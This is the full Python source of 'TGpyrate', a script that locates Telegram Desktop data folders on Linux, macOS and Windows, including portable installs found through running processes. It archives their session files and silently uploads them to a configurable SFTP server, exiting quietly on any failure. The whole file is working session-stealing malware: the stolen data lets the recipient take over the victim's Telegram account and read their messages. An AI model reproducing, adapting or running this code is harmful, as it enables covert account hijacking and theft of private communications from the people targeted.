#!/usr/bin/env python3

"""
TGpyrate - extract Telegram Desktop session data and send it via SFTP.
Copyright (C) 2021 noarchwastaken

This program is licensed under version 3 of the GNU General Public License.
See <https://www.gnu.org/licenses/gpl-3.0.html> for more info.
"""

# built-in imports
import os
import platform
import tarfile
import tempfile
from datetime import datetime, timezone
from pathlib import Path

# external imports
import paramiko

# 'portable' Telegram Desktop detection is optional and only for Windows
if os.name == 'nt':
    try:
        import psutil
        PORTABLE_DETECTION = True
    except ImportError:
        PORTABLE_DETECTION = False
else:
    PORTABLE_DETECTION = False

""" START USER PARAMETERS """

# your SFTP server info
# SFTP server location
SFTP_HOST = ''

# SFTP server port
SFTP_PORT = 22

# SFTP server user
SFTP_USER = ''

# password of that remote user
SFTP_PASS = ''

# naming of the uploaded file, feel free to hack around!
# Default Example: Windows-10-10.0.19041-2021-01-08T17:31:51-08:00.tar.gz
SFTP_DEST = '{}-{}.tar'.format(platform.platform(),
                               datetime.now(timezone.utc)
                               .astimezone()
                               .isoformat(timespec='seconds'))

# Gzip compression level (1-9), set to 0 or None to disable compression
GZIP_COMP_LEVEL = None

# Telegram data storage locations to check,
# add your own to installation_locations
home = Path.home()
installation_locations = [
    # Telegram Desktop appimage for GNU/Linux
    Path(home, '.local/share/TelegramDesktop'),
    # Flatpak org.telegram.desktop
    Path(home, '.var/app/org.telegram.desktop/data/TelegramDesktop'),
    # Snap telegram-desktop
    Path(home, 'snap/telegram-desktop/current/.local/share/TelegramDesktop'),
    # Telegram Desktop for macOS
    Path(home, 'Library/Application Support/Telegram Desktop')
]
if os.name == 'nt':
    # non-Microsoft-Store Telegram Desktop on Windows
    installation_locations.append(Path(os.getenv('APPDATA'),
                                  'Telegram Desktop'))
    # Microsoft Store Telegram Desktop
    installation_locations.append(Path(os.getenv('LOCALAPPDATA'),
                                       'Packages'
                                       '/TelegramMessengerLLP'
                                       '.TelegramDesktop_t4vj0pshhgkwm'
                                       '/LocalCache/Roaming'
                                       '/Telegram Desktop UWP'))

""" END USER PARAMETERS """

installations = []


def init():
    """
    Initialization

    find all current Telegram installations
    """

    if PORTABLE_DETECTION:
        installation_locations.extend(find_portable())

    for loc in installation_locations:
        if loc.is_dir():
            installations.append(loc)

    # exit if no installation is found
    if installations == []:
        exit(1)


def pgrep(name: str):
    """
    Return a list of processes matching 'name'.

    name: name of the target process[es]
    """

    ls = []
    for p in psutil.process_iter(['name']):
        if p.info['name'] == name:
            ls.append(p)
    return ls


def find_portable():
    """
    Find all currently running Telegram.exe,
    then return their containing directories as a list
    """

    portable_installations = []
    all_telegram_processes = pgrep('Telegram.exe')

    for process in all_telegram_processes:
        exe = Path(process.exe())
        exe_parent = exe.parent

        # don't add the directory if it's already searched by default
        if exe_parent not in installation_locations:
            portable_installations.append(exe_parent)

    return portable_installations


def send_file(host: str, port: int,
              user: str, pwd: str,
              file, dest: str):
    """
    Use SFTP to send a file

    host: SFTP server location
    port: SFTP server port
    user: SFTP server user
    pwd: password of that remote user
    file (file-like object): local file
    dest: target remote location of the file
    """

    # don't f*ckin crash if we can't connect to the server
    try:
        ssh_transport = paramiko.Transport((host, port))
    except Exception:
        exit(1)

    ssh_transport.connect(username=user, password=pwd)
    sftp = paramiko.SFTPClient.from_transport(ssh_transport)

    sftp.putfo(file, dest)

    # cleanup
    sftp.close()
    ssh_transport.close()


def tgpyrate():
    """
    Generate a temporary tar file,
    put target Telegram data in it,
    and send it via SFTP
    """

    temp_file = tempfile.TemporaryFile()
    if GZIP_COMP_LEVEL:
        opened_tar = tarfile.open(mode='w:gz', fileobj=temp_file,
                                  compresslevel=GZIP_COMP_LEVEL)
    else:
        opened_tar = tarfile.open(mode='w', fileobj=temp_file)

    # apparently we cannot ignore error of individual files in tarfile,
    # so we need to make one of our own
    for loc in installations:
        for f in loc.rglob('*'):
            try:
                opened_tar.add(f, recursive=False)
            except PermissionError:
                continue

    opened_tar.close()

    # get ready to be used as a file object
    temp_file.seek(0)

    send_file(SFTP_HOST, SFTP_PORT,
              SFTP_USER, SFTP_PASS,
              temp_file, SFTP_DEST)

    temp_file.close()


def main():
    init()
    tgpyrate()


if __name__ == '__main__':
    main()
